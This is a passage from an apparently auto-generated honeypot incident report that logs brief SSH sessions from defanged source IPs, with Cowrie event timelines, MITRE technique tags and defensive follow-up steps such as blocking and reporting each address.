| `2026-07-16 22:41:27` | `cowrie.client.kex` |
| `2026-07-16 22:41:28` | `cowrie.login.success` |
| `2026-07-16 22:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1397145ddee

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-16 22:42 |
| **Last Seen** | 2026-07-16 22:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:42:38` | `cowrie.session.connect` |
| `2026-07-16 22:42:38` | `cowrie.client.version` |
| `2026-07-16 22:42:38` | `cowrie.client.kex` |
| `2026-07-16 22:42:39` | `cowrie.login.success` |
| `2026-07-16 22:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-395a7c32e3cf

| Field | Detail |
|---|---|
| **Source IP** | `182.76.36[.]62` |
| **First Seen** | 2026-07-16 22:45 |
| **Last Seen** | 2026-07-16 22:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:45:20` | `cowrie.session.connect` |
| `2026-07-16 22:45:21` | `cowrie.client.version` |
| `2026-07-16 22:45:21` | `cowrie.client.kex` |
| `2026-07-16 22:45:23` | `cowrie.login.success` |
| `2026-07-16 22:45:24` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.36[.]62` to AbuseIPDB if not already reported
- [ ] Block `182.76.36[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a48494acc086

| Field | Detail |
|---|---|
| **Source IP** | `165.245.241[.]122` |
| **First Seen** | 2026-07-16 22:45 |
| **Last Seen** | 2026-07-16 22:45 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:45:25` | `cowrie.session.connect` |
| `2026-07-16 22:45:31` | `cowrie.login.success` |
| `2026-07-16 22:45:31` | `cowrie.session.params` |
| `2026-07-16 22:45:36` | `cowrie.log.closed` |
| `2026-07-16 22:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.245.241[.]122` to AbuseIPDB if not already reported
- [ ] Block `165.245.241[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3104569fc903

| Field | Detail |
|---|---|
| **Source IP** | `20.46.45[.]121` |
| **First Seen** | 2026-07-16 22:45 |
| **Last Seen** | 2026-07-16 22:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:45:33` | `cowrie.session.connect` |
| `2026-07-16 22:45:34` | `cowrie.client.version` |
| `2026-07-16 22:45:34` | `cowrie.client.kex` |
| `2026-07-16 22:45:36` | `cowrie.login.success` |
| `2026-07-16 22:45:36` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.46.45[.]121` to AbuseIPDB if not already reported
- [ ] Block `20.46.45[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfd1d014269a

| Field | Detail |
|---|---|
| **Source IP** | `165.245.241[.]122` |
| **First Seen** | 2026-07-16 22:45 |
| **Last Seen** | 2026-07-16 22:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:45:41` | `cowrie.session.connect` |
| `2026-07-16 22:45:41` | `cowrie.login.success` |
| `2026-07-16 22:45:42` | `cowrie.session.params` |
| `2026-07-16 22:45:46` | `cowrie.log.closed` |
| `2026-07-16 22:45:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.245.241[.]122` to AbuseIPDB if not already reported
- [ ] Block `165.245.241[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c3e62b51f17

| Field | Detail |
|---|---|
| **Source IP** | `165.245.241[.]122` |
| **First Seen** | 2026-07-16 22:45 |
| **Last Seen** | 2026-07-16 22:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:45:46` | `cowrie.session.connect` |
| `2026-07-16 22:45:46` | `cowrie.login.success` |
| `2026-07-16 22:45:47` | `cowrie.session.params` |
| `2026-07-16 22:45:51` | `cowrie.log.closed` |
| `2026-07-16 22:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.245.241[.]122` to AbuseIPDB if not already reported
- [ ] Block `165.245.241[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4d5132dcdf1

| Field | Detail |
|---|---|
| **Source IP** | `165.245.241[.]122` |
| **First Seen** | 2026-07-16 22:45 |
| **Last Seen** | 2026-07-16 22:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:45:51` | `cowrie.session.connect` |
| `2026-07-16 22:45:51` | `cowrie.login.success` |
| `2026-07-16 22:45:52` | `cowrie.session.params` |
| `2026-07-16 22:45:56` | `cowrie.log.closed` |
| `2026-07-16 22:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.245.241[.]122` to AbuseIPDB if not already reported
- [ ] Block `165.245.241[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8af91c0980d

| Field | Detail |
|---|---|
| **Source IP** | `165.245.241[.]122` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:30` | `cowrie.session.connect` |
| `2026-07-16 22:46:30` | `cowrie.login.success` |
| `2026-07-16 22:46:30` | `cowrie.session.params` |
| `2026-07-16 22:46:30` | `cowrie.command.input` |
| `2026-07-16 22:46:30` | `cowrie.command.failed` |
| `2026-07-16 22:46:30` | `cowrie.command.input` |
| `2026-07-16 22:46:30` | `cowrie.command.failed` |
| `2026-07-16 22:46:30` | `cowrie.command.input` |
| `2026-07-16 22:46:30` | `cowrie.command.failed` |
| `2026-07-16 22:46:30` | `cowrie.command.input` |
| `2026-07-16 22:46:30` | `cowrie.command.failed` |
| `2026-07-16 22:46:30` | `cowrie.command.input` |
| `2026-07-16 22:46:30` | `cowrie.command.failed` |
| `2026-07-16 22:46:30` | `cowrie.command.input` |
| `2026-07-16 22:46:30` | `cowrie.command.failed` |
| `2026-07-16 22:46:30` | `cowrie.command.input` |
| `2026-07-16 22:46:30` | `cowrie.command.failed` |
| `2026-07-16 22:46:30` | `cowrie.command.input` |
| `2026-07-16 22:46:30` | `cowrie.command.failed` |
| `2026-07-16 22:46:30` | `cowrie.command.input` |
| `2026-07-16 22:46:37` | `cowrie.log.closed` |
| `2026-07-16 22:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.245.241[.]122` to AbuseIPDB if not already reported
- [ ] Block `165.245.241[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e453e49cb72d

| Field | Detail |
|---|---|
| **Source IP** | `46.101.133[.]128` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:37` | `cowrie.session.connect` |
| `2026-07-16 22:46:37` | `cowrie.login.success` |
| `2026-07-16 22:46:38` | `cowrie.session.params` |
| `2026-07-16 22:46:38` | `cowrie.command.input` |
| `2026-07-16 22:46:38` | `cowrie.command.failed` |
| `2026-07-16 22:46:38` | `cowrie.command.input` |
| `2026-07-16 22:46:38` | `cowrie.command.failed` |
| `2026-07-16 22:46:38` | `cowrie.command.input` |
| `2026-07-16 22:46:41` | `cowrie.log.closed` |
| `2026-07-16 22:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.133[.]128` to AbuseIPDB if not already reported
- [ ] Block `46.101.133[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35883f7e7915

| Field | Detail |
|---|---|
| **Source IP** | `104.248.251[.]155` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:37` | `cowrie.session.connect` |
| `2026-07-16 22:46:38` | `cowrie.login.success` |
| `2026-07-16 22:46:39` | `cowrie.session.params` |
| `2026-07-16 22:46:39` | `cowrie.command.input` |
| `2026-07-16 22:46:39` | `cowrie.command.failed` |
| `2026-07-16 22:46:39` | `cowrie.command.input` |
| `2026-07-16 22:46:39` | `cowrie.command.failed` |
| `2026-07-16 22:46:39` | `cowrie.command.input` |
| `2026-07-16 22:46:39` | `cowrie.log.closed` |
| `2026-07-16 22:46:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.248.251[.]155` to AbuseIPDB if not already reported
- [ ] Block `104.248.251[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b73bb47cb5f

| Field | Detail |
|---|---|
| **Source IP** | `104.248.142[.]195` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (compatible; Odin; hxxps://docs.getodin.com/), Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:37` | `cowrie.session.connect` |
| `2026-07-16 22:46:39` | `cowrie.login.success` |
| `2026-07-16 22:46:39` | `cowrie.session.params` |
| `2026-07-16 22:46:39` | `cowrie.command.input` |
| `2026-07-16 22:46:39` | `cowrie.command.input` |
| `2026-07-16 22:46:39` | `cowrie.command.failed` |
| `2026-07-16 22:46:39` | `cowrie.command.input` |
| `2026-07-16 22:46:39` | `cowrie.command.failed` |
| `2026-07-16 22:46:39` | `cowrie.command.input` |
| `2026-07-16 22:46:42` | `cowrie.log.closed` |
| `2026-07-16 22:46:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.248.142[.]195` to AbuseIPDB if not already reported
- [ ] Block `104.248.142[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea2e0e7757d8

| Field | Detail |
|---|---|
| **Source IP** | `159.89.109[.]204` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:38` | `cowrie.session.connect` |
| `2026-07-16 22:46:39` | `cowrie.login.success` |
| `2026-07-16 22:46:40` | `cowrie.session.params` |
| `2026-07-16 22:46:40` | `cowrie.command.input` |
| `2026-07-16 22:46:40` | `cowrie.command.failed` |
| `2026-07-16 22:46:40` | `cowrie.command.input` |
| `2026-07-16 22:46:40` | `cowrie.command.failed` |
| `2026-07-16 22:46:40` | `cowrie.command.input` |
| `2026-07-16 22:46:41` | `cowrie.log.closed` |
| `2026-07-16 22:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.89.109[.]204` to AbuseIPDB if not already reported
- [ ] Block `159.89.109[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1e37b4019e5

| Field | Detail |
|---|---|
| **Source IP** | `46.101.236[.]241` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:38` | `cowrie.session.connect` |
| `2026-07-16 22:46:40` | `cowrie.login.success` |
| `2026-07-16 22:46:41` | `cowrie.session.params` |
| `2026-07-16 22:46:41` | `cowrie.command.input` |
| `2026-07-16 22:46:41` | `cowrie.command.failed` |
| `2026-07-16 22:46:41` | `cowrie.command.input` |
| `2026-07-16 22:46:41` | `cowrie.command.failed` |
| `2026-07-16 22:46:41` | `cowrie.command.input` |
| `2026-07-16 22:46:43` | `cowrie.log.closed` |
| `2026-07-16 22:46:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.236[.]241` to AbuseIPDB if not already reported
- [ ] Block `46.101.236[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97e72aeb0863

| Field | Detail |
|---|---|
| **Source IP** | `46.101.133[.]128` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:39` | `cowrie.session.connect` |
| `2026-07-16 22:46:41` | `cowrie.login.success` |
| `2026-07-16 22:46:41` | `cowrie.session.params` |
| `2026-07-16 22:46:41` | `cowrie.command.input` |
| `2026-07-16 22:46:41` | `cowrie.command.failed` |
| `2026-07-16 22:46:41` | `cowrie.command.input` |
| `2026-07-16 22:46:41` | `cowrie.command.failed` |
| `2026-07-16 22:46:41` | `cowrie.command.input` |
| `2026-07-16 22:46:42` | `cowrie.log.closed` |
| `2026-07-16 22:46:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.133[.]128` to AbuseIPDB if not already reported
- [ ] Block `46.101.133[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a986f7f0cd75

| Field | Detail |
|---|---|
| **Source IP** | `104.248.251[.]155` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:39` | `cowrie.session.connect` |
| `2026-07-16 22:46:41` | `cowrie.login.success` |
| `2026-07-16 22:46:42` | `cowrie.session.params` |
| `2026-07-16 22:46:42` | `cowrie.command.input` |
| `2026-07-16 22:46:42` | `cowrie.command.failed` |
| `2026-07-16 22:46:42` | `cowrie.command.input` |
| `2026-07-16 22:46:42` | `cowrie.command.failed` |
| `2026-07-16 22:46:42` | `cowrie.command.input` |
| `2026-07-16 22:46:42` | `cowrie.log.closed` |
| `2026-07-16 22:46:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.248.251[.]155` to AbuseIPDB if not already reported
- [ ] Block `104.248.251[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd02ee880011

| Field | Detail |
|---|---|
| **Source IP** | `159.89.109[.]204` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:41` | `cowrie.session.connect` |
| `2026-07-16 22:46:42` | `cowrie.login.success` |
| `2026-07-16 22:46:43` | `cowrie.session.params` |
| `2026-07-16 22:46:43` | `cowrie.command.input` |
| `2026-07-16 22:46:43` | `cowrie.command.failed` |
| `2026-07-16 22:46:43` | `cowrie.command.input` |
| `2026-07-16 22:46:43` | `cowrie.command.failed` |
| `2026-07-16 22:46:43` | `cowrie.command.input` |
| `2026-07-16 22:46:45` | `cowrie.log.closed` |
| `2026-07-16 22:46:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.89.109[.]204` to AbuseIPDB if not already reported
- [ ] Block `159.89.109[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbe09b22f4ad

| Field | Detail |
|---|---|
| **Source IP** | `46.101.236[.]241` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:42` | `cowrie.session.connect` |
| `2026-07-16 22:46:43` | `cowrie.login.success` |
| `2026-07-16 22:46:43` | `cowrie.session.params` |
| `2026-07-16 22:46:43` | `cowrie.command.input` |
| `2026-07-16 22:46:43` | `cowrie.command.failed` |
| `2026-07-16 22:46:43` | `cowrie.command.input` |
| `2026-07-16 22:46:43` | `cowrie.command.failed` |
| `2026-07-16 22:46:43` | `cowrie.command.input` |
| `2026-07-16 22:46:44` | `cowrie.log.closed` |
| `2026-07-16 22:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.236[.]241` to AbuseIPDB if not already reported
- [ ] Block `46.101.236[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfcccf8967c4

| Field | Detail |
|---|---|
| **Source IP** | `46.101.133[.]128` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:42` | `cowrie.session.connect` |
| `2026-07-16 22:46:43` | `cowrie.login.success` |
| `2026-07-16 22:46:44` | `cowrie.session.params` |
| `2026-07-16 22:46:44` | `cowrie.command.input` |
| `2026-07-16 22:46:44` | `cowrie.command.failed` |
| `2026-07-16 22:46:44` | `cowrie.command.input` |
| `2026-07-16 22:46:44` | `cowrie.command.failed` |
| `2026-07-16 22:46:44` | `cowrie.command.input` |
| `2026-07-16 22:46:45` | `cowrie.log.closed` |
| `2026-07-16 22:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.133[.]128` to AbuseIPDB if not already reported
- [ ] Block `46.101.133[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68ede948465d

| Field | Detail |
|---|---|
| **Source IP** | `104.248.251[.]155` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:43` | `cowrie.session.connect` |
| `2026-07-16 22:46:44` | `cowrie.login.success` |
| `2026-07-16 22:46:45` | `cowrie.session.params` |
| `2026-07-16 22:46:45` | `cowrie.command.input` |
| `2026-07-16 22:46:45` | `cowrie.command.failed` |
| `2026-07-16 22:46:45` | `cowrie.command.input` |
| `2026-07-16 22:46:45` | `cowrie.command.failed` |
| `2026-07-16 22:46:45` | `cowrie.command.input` |
| `2026-07-16 22:46:45` | `cowrie.log.closed` |
| `2026-07-16 22:46:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.248.251[.]155` to AbuseIPDB if not already reported
- [ ] Block `104.248.251[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56eea81d3e80

| Field | Detail |
|---|---|
| **Source IP** | `159.89.109[.]204` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:44` | `cowrie.session.connect` |
| `2026-07-16 22:46:45` | `cowrie.login.success` |
| `2026-07-16 22:46:45` | `cowrie.session.params` |
| `2026-07-16 22:46:45` | `cowrie.command.input` |
| `2026-07-16 22:46:45` | `cowrie.command.failed` |
| `2026-07-16 22:46:45` | `cowrie.command.input` |
| `2026-07-16 22:46:45` | `cowrie.command.failed` |
| `2026-07-16 22:46:45` | `cowrie.command.input` |
| `2026-07-16 22:46:47` | `cowrie.log.closed` |
| `2026-07-16 22:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.89.109[.]204` to AbuseIPDB if not already reported
- [ ] Block `159.89.109[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ed919f97681

| Field | Detail |
|---|---|
| **Source IP** | `46.101.236[.]241` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:45` | `cowrie.session.connect` |
| `2026-07-16 22:46:46` | `cowrie.login.success` |
| `2026-07-16 22:46:46` | `cowrie.session.params` |
| `2026-07-16 22:46:46` | `cowrie.command.input` |
| `2026-07-16 22:46:46` | `cowrie.command.failed` |
| `2026-07-16 22:46:46` | `cowrie.command.input` |
| `2026-07-16 22:46:46` | `cowrie.command.failed` |
| `2026-07-16 22:46:46` | `cowrie.command.input` |
| `2026-07-16 22:46:47` | `cowrie.log.closed` |
| `2026-07-16 22:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.236[.]241` to AbuseIPDB if not already reported
- [ ] Block `46.101.236[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cf9b6a75c6d

| Field | Detail |
|---|---|
| **Source IP** | `104.248.251[.]155` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:46` | `cowrie.session.connect` |
| `2026-07-16 22:46:46` | `cowrie.login.success` |
| `2026-07-16 22:46:47` | `cowrie.session.params` |
| `2026-07-16 22:46:47` | `cowrie.command.input` |
| `2026-07-16 22:46:47` | `cowrie.command.failed` |
| `2026-07-16 22:46:47` | `cowrie.command.input` |
| `2026-07-16 22:46:47` | `cowrie.command.failed` |
| `2026-07-16 22:46:47` | `cowrie.command.input` |
| `2026-07-16 22:46:47` | `cowrie.log.closed` |
| `2026-07-16 22:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.248.251[.]155` to AbuseIPDB if not already reported
- [ ] Block `104.248.251[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e09b02ffbcd

| Field | Detail |
|---|---|
| **Source IP** | `104.248.251[.]155` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:47` | `cowrie.session.connect` |
| `2026-07-16 22:46:47` | `cowrie.login.success` |
| `2026-07-16 22:46:48` | `cowrie.session.params` |
| `2026-07-16 22:46:48` | `cowrie.command.input` |
| `2026-07-16 22:46:48` | `cowrie.command.failed` |
| `2026-07-16 22:46:48` | `cowrie.command.input` |
| `2026-07-16 22:46:48` | `cowrie.command.failed` |
| `2026-07-16 22:46:48` | `cowrie.command.input` |
| `2026-07-16 22:46:48` | `cowrie.log.closed` |
| `2026-07-16 22:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.248.251[.]155` to AbuseIPDB if not already reported
- [ ] Block `104.248.251[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e6133325b77

| Field | Detail |
|---|---|
| **Source IP** | `104.248.251[.]155` |
| **First Seen** | 2026-07-16 22:46 |
| **Last Seen** | 2026-07-16 22:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:46:48` | `cowrie.session.connect` |
| `2026-07-16 22:46:48` | `cowrie.login.success` |
| `2026-07-16 22:46:48` | `cowrie.session.params` |
| `2026-07-16 22:46:48` | `cowrie.command.input` |
| `2026-07-16 22:46:48` | `cowrie.command.failed` |
| `2026-07-16 22:46:48` | `cowrie.command.input` |
| `2026-07-16 22:46:48` | `cowrie.command.failed` |
| `2026-07-16 22:46:48` | `cowrie.command.input` |
| `2026-07-16 22:46:48` | `cowrie.log.closed` |
| `2026-07-16 22:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.248.251[.]155` to AbuseIPDB if not already reported
